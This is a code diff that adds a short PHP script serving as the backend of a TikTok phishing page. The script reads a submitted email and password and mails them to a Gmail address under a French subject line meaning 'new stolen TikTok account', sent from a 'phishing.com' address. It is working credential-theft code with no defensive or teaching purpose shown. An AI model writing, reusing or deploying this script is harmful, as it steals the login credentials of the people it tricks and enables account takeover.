@@ -1,0 +1,13 @@
+<?php
+        $email = $_POST['email'];
+        $password = $_POST['password'];
+
+        $to = "repondsjune@gmail.com";
+        $subject = "Nouveau compte TikTok volé";
+        $message = "Email: $email\nMot de passe: $password";
+        $headers = "From: tiktok@phishing.com";
+
+        mail($to, $subject, $message, $headers);
+
+        echo "Données envoyées avec succès!";
+        ?>
